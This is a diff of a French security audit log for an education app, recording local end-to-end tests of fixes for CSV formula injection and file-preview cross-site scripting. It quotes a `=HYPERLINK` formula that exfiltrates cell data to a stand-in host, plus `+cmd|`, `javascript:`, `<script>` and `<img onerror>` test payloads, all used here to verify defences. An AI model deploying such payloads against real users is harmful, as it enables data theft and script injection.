@@ -160,7 +160,17 @@ Un étudiant nommé par exemple `=HYPERLINK("http://evil.example/steal?x="&A2,"c
 
 **Point de vigilance :** ces modèles « raisonnent » et les tokens de raisonnement consomment le budget de sortie ; la correction IA plafonne à `maxTokens: 500` — à surveiller sur des réponses longues (réponse vide possible).
 
-**Vérifié en production (Render) après déploiement des constats 3 à 8 :** `/api/ai/test` → 404, `X-Powered-By` supprimé, en-têtes `helmet` présents, préflight CORS depuis GitHub Pages toujours accepté, connexion (401 sur faux compte) OK avec les en-têtes CORS. **Non vérifié en ligne :** l'aperçu de fichiers déposés et l'export CSV (nécessitent un compte enseignant et des données réelles).
+### Test bout en bout des correctifs 1 et 2 (2026-09-25)
+
+**Méthode :** environnement local complet (vrai backend + vrai frontend Vite + base Postgres de **test** `edueval_test`, jamais la prod), avec un stockage objet en mémoire à la place du bucket S3 réel. Données de test : 4 étudiants dont 2 aux noms piégés (`=HYPERLINK(…)`, `+cmd|…`), un `.xlsx` et un `.docx` piégés (liens `javascript:`, cellules/paragraphes contenant `<script>` et `<img onerror>`). Tout a été fait depuis l'UI enseignant réelle ; environnement démonté et base de test vidée ensuite.
+
+**Constat 2 (export CSV) — corrigé, confirmé :** dans le CSV réellement généré, les noms commençant par `=` ou `+` sont préfixés d'une apostrophe (`'=HYPERLINK(…)`, `'+cmd|…`), et les noms normaux (guillemets, point-virgule) gardent un échappement RFC 4180 correct.
+
+**Constat 1 (aperçu de fichiers) — corrigé, confirmé :** avant sanitisation, les sorties brutes de `mammoth` et de `sheet_to_html` contenaient bien un lien `javascript:` (les deux vecteurs étaient réels, pas seulement Excel). Après : `href` supprimé sur les liens, 0 balise `<script>`, 0 `<img>`, aucun `javascript:` dans le DOM ; les payloads s'affichent comme texte littéral inoffensif, les tableaux et paragraphes légitimes restent lisibles.
+
+**Régression introduite par mon premier correctif, trouvée et corrigée grâce à ce test :** le sanitiseur laissait apparaître « SheetJS Table Export » (le `<title>` de l'enveloppe HTML de `sheet_to_html`, invisible avant) au-dessus de chaque aperçu Excel. Corrigé via `nonTextTags` (`title`, `head`) dans [attempt.service.js](backend/src/services/attempt.service.js) + test de non-régression ; suite : `134 passed`. Re-vérifié dans l'UI.
+
+**Vérifié en production (Render) après déploiement des constats 3 à 8 :** `/api/ai/test` → 404, `X-Powered-By` supprimé, en-têtes `helmet` présents, préflight CORS depuis GitHub Pages toujours accepté, connexion (401 sur faux compte) OK avec les en-têtes CORS. **Non vérifié en ligne :** l'aperçu de fichiers déposés et l'export CSV n'ont été testés qu'en local (voir ci-dessus) — pas sur Render, qui exigerait un compte enseignant réel. Le correctif « SheetJS Table Export » n'est pas encore déployé.
 
 ---
 
